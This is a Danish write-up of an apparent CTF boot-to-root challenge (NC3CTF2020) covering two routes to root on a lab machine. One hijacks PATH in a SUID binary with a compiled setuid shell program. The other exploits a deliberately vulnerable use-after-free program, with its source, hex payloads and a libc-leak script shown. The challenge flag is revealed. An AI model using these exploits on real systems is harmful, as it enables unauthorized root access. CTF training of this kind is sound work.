## B2R - Root
<hr>

Som de forrige år er der her mulighed for at tage mindst 2 veje til målet: En PWN eller en "unintended" via Linux tricks.


Vi etablerer først en SSH adgang, så vi ikke er så låste i vores shell:


```text
kali@kali:~/Desktop/nc3ctf2020$ ssh -i storenisse.rsa storenisse@10.10.158.251
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
 _______ __                                       __           __ __         __               
|    |  |__|.-----.-----.-----.----/.-----.-----.|  |--.-----.|  |__|.-----.|  |_.-----.-----.
|       |  ||__ --|__ --|  -__|  _/ |     |__ --||    <|  -__||  |  ||__ --||   _|  -__|     |
|__|____|__||_____|_____|_____|_/___|__|__|_____||__|__|_____||__|__||_____||____|_____|__|__|
.------------------------------/--------------------------------------------------------------->
:  #NC3CTF2020
<----------------------------------------------------------------------------------------------


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

storenisse@nisseoenskelisten:~$ id
uid=1000(storenisse) gid=1000(storenisse) groups=1000(storenisse),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lpadmin),118(sambashare)
storenisse@nisseoenskelisten:~$
```

<br>

### 1. "unintended"/Linux tricks - Udnyt PATH

Vi finder alle SUID filer:

```shell
storenisse@nisseoenskelisten:~$ find / -perm -4000 2>/dev/null
/home/storenisse/import_ønsker.elf
/var/www/html/nissetestprojekt2020/disable_firewall.elf
/bin/mount
/bin/ping
/bin/umount
/bin/su
/bin/ping6
/bin/fusermount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
storenisse@nisseoenskelisten:~$
```

Første fil kender vi, men nummer 2 på listen bruges åbenbart af "DEV" mode til at slå firewall fra. Lad os se:

```shell
storenisse@nisseoenskelisten:~$ ls -al /var/www/html/nissetestprojekt2020/disable_firewall.elf
-rwsr-xr-x 1 root root 14424 Nov 11 18:19 /var/www/html/nissetestprojekt2020/disable_firewall.elf
```

Lad os se nærmere på filen:

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char** argv)
{
  if (setuid(0) == -1)
  {
	  printf("setUID ERROR");
	  return 1;
  }
  system("iptables -P INPUT ACCEPT");
  return 0;
}
```

Ok, så der sættes til UID #0 og derefter kører "iptables" for at åbne firewall. Det ser da fint ud, eller?

Der er en lille fejl: Der bruges ikke en absolut sti til "iptables", og vi kan derfor narre programmet til at starte vores eget program i stedet - som UID #0 (root). Vi skal bare navngive vores eget program "iptables". Det er vigtigt at forstå at havde stien været en absolut sti, dvs.:

```text
/usr/sbin/iptables
```

så havde man ikke kunne udnytte dette.

<br>

Vi compiler et SUID program på host:

```shell
kali@kali:~$ cat suid.c 
int main(void) {
    setgid(0); setuid(0);
    execl("/bin/sh", "sh", 0);
}
kali@kali:~$
kali@kali:~$ gcc -Wl,--hash-style=both -o suid64.elf suid.c
suid.c: In function ‘main’:
suid.c:3:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    3 |     setgid(0); setuid(0);
      |     ^~~~~~
suid.c:3:16: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setgid(0); setuid(0);
      |                ^~~~~~
suid.c:4:5: warning: implicit declaration of function ‘execl’ [-Wimplicit-function-declaration]
    4 |     execl("/bin/sh", "sh", 0);
      |     ^~~~~
suid.c:4:5: warning: incompatible implicit declaration of built-in function ‘execl’
kali@kali:~$
```

Derefter overføres filen til target, f.eks. i vores egen home mappe. Vi omnavngiver nu filen til "iptables" og sætter PATH til kun at se i vores mappe:

```shell
storenisse@nisseoenskelisten:~$ env
XDG_SESSION_ID=3
TERM=xterm-256color
...
PATH=/home/storenisse/bin:/home/storenisse/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
PWD=/home/storenisse
...
_=/usr/bin/env
storenisse@nisseoenskelisten:~$ PATH=. /var/www/html/nissetestprojekt2020/disable_firewall.elf
# id
sh: 1: id: not found
# PATH=/home/storenisse/bin:/home/storenisse/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lpadmin),118(sambashare),1000(storenisse)
# cd /root
# ls -al
total 28
drwx------  2 root root 4096 Nov 20 14:35 .
drwxr-xr-x 25 root root 4096 Nov 18 21:09 ..
-rw-------  1 root root   13 Nov 20 14:35 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-------  1 root root   36 Nov 11 13:50 .lesshst
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
----------  1 root root   54 Nov 18 21:27 root.txt
#
# cat root.txt
```

<details>
<summary>Spoiler alert - Flaget til root:</summary>

nc3{g0dt_gaaet_m3ster_n1sse_og_glaedelig_jul_fra_nc3}

</details>

<br>


### 2. PWN

Denne vej er noget mere udfordrende, men derved også sjovere :)

Efter endnu noget chmod, kan vi nu gå ind i /bulkimport_ønsker :

```shell
storenisse@nisseoenskelisten:/bulkimport_ønsker$ ls -la
total 40
drwxrwxr-x  2 storenisse storenisse  4096 Nov 20 14:05 .
drwxr-xr-x 25 root       root        4096 Nov 18 21:09 ..
---Sr-x---  1 root       storenisse 14328 Nov 19 21:55 bulkimport_ønsker.elf
storenisse@nisseoenskelisten:/bulkimport_ønsker$
storenisse@nisseoenskelisten:/bulkimport_ønsker$ ./bulkimport_ønsker.elf
| BulkImporter af ønsker - Copyright (c) 2020 Nisseværkstedet    |
\----------------------------------------------------------------/
Segmentation fault (core dumped)
storenisse@nisseoenskelisten:/bulkimport_ønsker$
```

Den crasher godt nok, men den kan da køres. Tid til endnu en PWN.

Her har vi prøvet at gøre opgaven svær, uden at være alt for svær. Pointen er at hvor den første PWN var et klassisk Buffer Overflow, uden nogen form for sikkerhed (kunne f.eks. eksekvere kode direkte fra stakken), så har vi her en noget sværre udfordring:

Et tjek af filen med "checksec" viser at alt er slået til. Dvs.:

* [NX](https://en.wikipedia.org/wiki/Executable_space_protection) (kan IKKE køre kode fra stakken)
* [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) (Koden startes fra tilfældige adresser hver gang)

NX betyder at vi må bruge [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) gadgets.

ASLR betyder at vi skal finde et memory leak, før vi ved hvilken adresse vi skal bruge i et exploit.

Ved at anlysere programmet i f.eks. Ghidra eller IDA Pro, kan en sårbarhed findes, der omhandler [Use-After-Free](https://en.wikipedia.org/wiki/Dangling_pointer). Dette sker ved at programmet læser en fil fra disken:

```text
nye_ønsker.wishes
```

Baseret på indholdet af denne fil, så kan der laves en ny fil:

```text
nye_ønsker.wishes.encrypted
```

Men først skal man forstå fil formatet, som programmet forventer. Der er tale om et chunk-baseret format, hvor hver chunk starter med 1 byte, der både indeholder en TYPE og en STØRRELSE. For bedre at forstå programmet, vises her hele kildekoden:

```C
///
/// gcc bulkimport_ønsker.cpp -o bulkimport_ønsker.elf -lstdc++ -Wl,-z,relro,-z,now -fstack-protector -D_FORTIFY_SOURCE=1 -Wall -O2 -s
///
/// November 2020 THeWiZRD/NC3
///

#include <unistd.h>
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <chrono>
#include <thread>


struct SWish;
struct SWishObject;

typedef void (*Constructer_t)(SWishObject*, const char* pData, const uint8_t dataSize);
typedef void (*Destructer_t)(SWishObject*);
typedef void (*Process_t)(SWishObject*);

typedef FILE* (pfopen)( const char * filename, const char * mode );


enum EChunkID : uint8_t
{
	eCHUNKID_NOP,
	eCHUNKID_SET_USER_ID,			/// 4 bytes: uint32_t = ID
	eCHUNKID_ADD_WISH_OBJ,			/// 0 bytes - Opretter et ønske objekt
	eCHUNKID_ADD_WISH,				/// 32 bytes : Ønske tekst
	eCHUNKID_DELETE_WISH_OBJ,		/// 0 bytes - Sletter det nuværende ønske objekt
	eCHUNKID_WRITE_WISH_TO_FILE,	/// 0 bytes - Append buffered wish to file. Kan leake memory ved først at bruge "eCHUNKID_COPY_WISH"
	eCHUNKID_COPY_WISH,				/// 4 bytes - The user to copy wish from. Bruges til arbitary read-what-where
};

#pragma pack(push, 1)
struct SChunk
{
	EChunkID id : 3;
	uint8_t length : 5;
};
#pragma pack(pop)

static_assert(sizeof(SChunk) == 1, "!");

/// 32 bytes
struct SWish
{
	char aText[32];
};

/// 32 bytes
struct SWishObject
{
	SWish*			pWish;						//< 8 bytes
	Process_t		pFunctionPtrToProcess;		//< 8 bytes
	Constructer_t	pFunctionPtrToConstructor;	//< 8 bytes
	Destructer_t	pFunctionPtrToDestructor;	//< 8 bytes

	static void Construct(SWishObject* pObject, const char* pData, const uint8_t dataSize)
	{
		pObject->pWish = new SWish;
		//printf("Construct: %p\n", pObject->pWish);

		memset(pObject->pWish, 0, sizeof(SWish));

		memcpy(pObject->pWish, pData, dataSize);
	}

	static void Destruct(SWishObject* pObject)
	{
		delete pObject->pWish;
	}

	static void Process(SWishObject* pObject)
	{
		for (uint8_t i = 0; i < sizeof(SWish::aText); i++)
		{
			pObject->pWish->aText[i] ^= 64;
		}
	}
};


pfopen* g_p_fopen = (pfopen*)0xCAFEBABE31337322;
/// ........
pfopen** g_pp_fopen = (pfopen**)0x2e2e2e2e2e2e2e2e;
/// THeWiZRD
pfopen*** g_ppp_fopen = (pfopen***)0x54486557695a5244;


/// Wish objects for each user
static const uint8_t C_MAX_WISH_OBJECTS = 8;
SWishObject* g_apCurrentWishObject[C_MAX_WISH_OBJECTS];
uint32_t g_currentUserID = 0;


void Loop()
{
	//FILE* pFile = fopen("nye_ønsker.wishes", "rb");
	FILE* pFile = (***g_pp_fopen)("nye_ønsker.wishes", "rb");

	for (;;)
	{
		SChunk currentChunk;
		const size_t r1 = fread(&currentChunk, 1, sizeof(currentChunk), pFile);
		if (r1 != sizeof(currentChunk))
		{
			break;
		}

		uint8_t chunkData[32];

		if (currentChunk.length > sizeof(chunkData))
		{
			//printf("Potentielt overflow opdaget!\n");
			break;
		}

		const size_t r2 = fread(&chunkData, 1, currentChunk.length, pFile);
		if (r2 != currentChunk.length)
		{
			break;
		}

		switch (currentChunk.id)
		{
			case eCHUNKID_NOP:
				break;

			case eCHUNKID_SET_USER_ID:
			{
				const uint32_t wantedUserIndex = *(uint32_t*)&chunkData;
				if (wantedUserIndex < C_MAX_WISH_OBJECTS)
				{
					g_currentUserID = wantedUserIndex;
				}
				break;
			}

			case eCHUNKID_ADD_WISH_OBJ:
			{
				SWishObject* pWishObject = new SWishObject;
				//printf("eCHUNKID_ADD_WISH_OBJ: %p\n", pWishObject);

				pWishObject->pFunctionPtrToConstructor = &SWishObject::Construct;
				pWishObject->pFunctionPtrToDestructor = &SWishObject::Destruct;
				pWishObject->pFunctionPtrToProcess = &SWishObject::Process;

				g_apCurrentWishObject[g_currentUserID] = pWishObject;

				break;
			}

			case eCHUNKID_ADD_WISH:
			{
				auto pUser = g_apCurrentWishObject[g_currentUserID];

				const char* pWishDataFromFile = (const char*)&chunkData;

				if (pUser->pFunctionPtrToConstructor)
				{
					(*pUser->pFunctionPtrToConstructor)(pUser, pWishDataFromFile, currentChunk.length);
				}

				break;
			}

			case eCHUNKID_DELETE_WISH_OBJ:
			{
				//printf("eCHUNKID_DELETE_WISH_OBJ: %p\n", g_apCurrentWishObject[g_currentUserID]);
				delete g_apCurrentWishObject[g_currentUserID];
				break;
			}

			case eCHUNKID_WRITE_WISH_TO_FILE:
			{
				auto pUser = g_apCurrentWishObject[g_currentUserID];

				//printf("eCHUNKID_WRITE_WISH_TO_FILE: %p\n", pUser);

				/// Gør det nemmere at lave en magic gadget :)
				asm ("xor %rsi, %rsi");
				asm ("xor %rax, %rax");
//				asm ("shr %rax, 64");

				(*pUser->pFunctionPtrToProcess)(pUser);

//				FILE* pFileWriter = fopen("nye_ønsker.wishes.encrypted", "wb+");
				FILE* pFileWriter = (**g_pp_fopen)("nye_ønsker.wishes.encrypted", "wb+");
				const char* pText = pUser->pWish->aText;
				fwrite(pText, strlen(pText), 1, pFileWriter);
				fclose(pFileWriter);

				break;
			}

			case eCHUNKID_COPY_WISH:
			{
				const int32_t wantedUserIndex = *(int32_t*)&chunkData;
				if (wantedUserIndex < C_MAX_WISH_OBJECTS)		//< Ups! Vi bruger SIGNED, og der kan nu læses vilkårlige bytes nedad i hukommelsen.
				{
					auto pUserFrom = g_apCurrentWishObject[wantedUserIndex];
					auto pUserDest = g_apCurrentWishObject[g_currentUserID];

					memcpy(pUserDest->pWish->aText, pUserFrom->pWish->aText, sizeof(pUserFrom->pWish->aText));
				}

				break;
			}
		}
	}

	fclose(pFile);
}


int main(int argc, char** argv)
{
	printf("| BulkImporter af ønsker - Copyright (c) 2020 Nisseværkstedet    |\n");
	printf("\\----------------------------------------------------------------/\n");

	if (setuid(0) != 0)
	{
		return 1;
	}

	g_p_fopen = &fopen;
	g_pp_fopen = &g_p_fopen;
	g_ppp_fopen = &g_pp_fopen;

	for (;;)
	{
		Loop();

		std::this_thread::sleep_for(std::chrono::seconds(10));
	}

	return 0;
}
```

Det ses at målet er at eksekvere "magic gadget" som er én enkel adresse i LIBC, der spawner en shell.

Først kan vi lave en .wishes fil, der leaker pointeren til fopen, som jo er en del af LIBC, hvor magic gadget jo også er. Vi har brug for denne adresse da programmet jo kører med ALSR, og Magic Gadget er derfor tilfældig hver gang, vi starter programmet.

```text
02 2B 63 79 6B 65 6C 26 F5 FF FF FF 05

==>

eCHUNKID_ADD_WISH_OBJ
02

eCHUNKID_ADD_WISH med 5 chars:
2B | 63 79 6B 65 6C (cykel)

eCHUNKID_COPY_WISH
0x26 = 6 | 4

-11 == F5 FF FF FF

eCHUNKID_WRITE_WISH_TO_FILE	<-- Brug til at leake pointer
5
```

På target startes programmet i én terminal, og et andet terminal-vindue åbnes for at se indholdet af den oprettede fil:

```text
nye_ønsker.wishes.encrypted
```


```shell
storenisse@nisseoenskelisten:/bulkimport_ønsker$ ls -la
total 40
drwxrwxr-x  2 storenisse storenisse  4096 Nov 20 14:05 .
drwxr-xr-x 25 root       root        4096 Nov 18 21:09 ..
---Sr-x---  1 root       storenisse 14328 Nov 19 21:55 bulkimport_ønsker.elf
-rw-r--r--  1 storenisse storenisse    13 Nov 20 14:04 nye_ønsker.wishes
-rw-rw-r--  1 root       storenisse    32 Nov 20 14:05 nye_ønsker.wishes.encrypted
-rw-r--r--  1 storenisse storenisse    51 Nov 20 14:04 nye_ønsker.wishes_exploit_using_leak_and_python_decoder
-rw-r--r--  1 storenisse storenisse    13 Nov 20 14:04 nye_ønsker.wishes_leak
storenisse@nisseoenskelisten:/bulkimport_ønsker$ xxd nye_ønsker.wishes.encrypted
00000000: c08d 65e3 6a3f 4040 4040 4040 4040 4040  ..e.j?@@@@@@@@@@
00000010: 4040 4040 4040 4040 4040 4040 4040 4040  @@@@@@@@@@@@@@@@
storenisse@nisseoenskelisten:/bulkimport_ønsker$
```

Filen kopierer over på host, og der kørers et script, der XOR med 64, og derefter udregner adressen på Magic Gadget:

```python
import os
import struct


outputFile = 'nye_ønsker.wishes.encrypted'

def GetXORed(input) :
    r = bytearray()
    for c in input :
        r.append( c ^ 64 )
    return r


while True :
    if os.path.isfile(outputFile) :
        f = open(outputFile, 'rb')
        leakedEncrypted = f.read()
        f.close()
        print(', '.join(('0x%x' % x) for x in leakedEncrypted))
        leaked = GetXORed(leakedEncrypted)
        print(', '.join(hex(x) for x in leaked))
        addressOf__fopen = struct.unpack('<q', leaked[0:8])[0]
        print("addressOf__fopen:" + hex(addressOf__fopen))
        print("Magic Gadget on Kali:" + hex(addressOf__fopen + 356512))
        print("Magic Gadget on Target:" + hex(addressOf__fopen - 166746))

        break
```

Dette giver:

```text
0xc0, 0x8d, 0x65, 0xe3, 0x6a, 0x3f, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40
0x80, 0xcd, 0x25, 0xa3, 0x2a, 0x7f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
addressOf__fopen:0x7f2aa325cd80
Magic Gadget on Kali:0x7f2aa32b3e20
Magic Gadget on Target:0x7f2aa3234226
````

Har en anden .wishes fil klar, der rent faktisk får eksekvering af en vilkårlig adresse ved at udnytte Use-After-Free:

```hex
7f 2a a3 23 42 26 indsættes omvendt (Little/Big-endian):

$ xxd nye_ønsker.wishes
00000000: 0221 0700 0000 0204 2100 0000 00fb 4141  .!......!.....AA
00000010: 4141 4141 4141 2642 23a3 2a7f 0000 4141  AAAAAA&B#.*...AA
00000020: 4141 4141 4141 4141 4141 4141 4121 0700  AAAAAAAAAAAAA!..
00000030: 0000 05                                  ...

```

Vi venter på at programmet henter vores nye .wishes fil ind, og:

```shell
storenisse@nisseoenskelisten:/bulkimport_ønsker$ ./bulkimport_ønsker.elf
| BulkImporter af ønsker - Copyright (c) 2020 Nisseværkstedet    |
\----------------------------------------------------------------/
# id
uid=0(root) gid=1000(storenisse) groups=1000(storenisse),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)
# ls -al /root
total 28
drwx------  2 root root 4096 Nov 19 23:08 .
drwxr-xr-x 25 root root 4096 Nov 18 21:09 ..
-rw-------  1 root root   13 Nov 19 23:08 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-------  1 root root   36 Nov 11 13:50 .lesshst
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
----------  1 root root   54 Nov 18 21:27 root.txt
# cat /root/root.txt
```

<details>
<summary>Spoiler alert - Flaget til root:</summary>

nc3{g0dt_gaaet_m3ster_n1sse_og_glaedelig_jul_fra_nc3}

</details>
